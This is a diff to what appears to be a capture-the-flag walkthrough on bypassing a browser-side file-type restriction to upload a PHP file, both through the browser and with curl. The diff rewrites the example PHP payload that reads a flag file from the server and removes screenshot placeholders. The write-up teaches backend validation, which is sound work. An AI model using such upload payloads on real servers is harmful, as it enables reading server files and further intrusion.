@@ -29,7 +29,9 @@ The `accept` attribute is what limits the selectable files to only PNG and JPEG 
 4. Now try uploading a `.php` file, for example, a simple PHP file that reads the flag:
 
 ```php
-<?php echo file_get_contents('/flag.txt'); ?>
+<?php
+echo "FLAG: " . file_get_contents("/flag");
+?>
 ```
 
 5. After uploading, you should receive a message like:
@@ -46,9 +48,6 @@ This method clearly shows how **frontend protections are superficial**. HTML att
 
 **The takeaway**: Always perform file validation and filtering on the backend — it's the only place you can trust.
 
-<!-- Screenshot placeholder for file input modification -->
-<!-- Screenshot placeholder for shell.php output -->
-
 ---
 
 ## Option 2: Using `curl -F` to Upload the PHP File
@@ -60,7 +59,9 @@ If you prefer using the command line or want to avoid dealing with the browser e
 1. Prepare your malicious file `shell.php`:
 
 ```php
-<?php echo file_get_contents('/flag.txt'); ?>
+<?php
+echo "FLAG: " . file_get_contents("/flag");
+?>
 ```
 
 2. Use `curl` to upload it:
